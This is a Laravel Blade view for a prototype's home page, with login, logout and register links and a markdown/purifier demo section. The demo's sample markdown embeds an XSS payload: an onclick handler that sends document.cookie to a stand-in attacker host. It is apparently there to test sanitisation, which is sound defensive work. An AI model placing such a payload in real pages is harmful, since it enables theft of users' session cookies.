@extends('layouts.master')

@section('content')
    <h1>Home page</h1>

    <p>This is the front page of the system. You do not need to be logged
        in to view it.</p>

    <p>This is obviously not the correct view for the actual project, but
        one that is created to give easy access to the prototype system.</p>

    <h2>Links</h2>

    <ul>
        <li><a href="{{URL::route('login')}}">Login</a></li>
        <li><a href="{{URL::route('logout')}}">Logout</a></li>
        <li><a href="{{URL::route('users.create')}}">Register</a></li>
    </ul>

<h2>Markdown and Purifier</h2>
{{ HTML::markdown('<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">This is</a> an example of the PHP Typography project.

It was released in 2009, and helps improve web typography.

It "replaces characters" and adds wrapper spans for adjusting the appearance & style of a page.

<dl>
    <dt>Term</dt>
    <dd>Definition</dd>
</dl>') }}
@stop
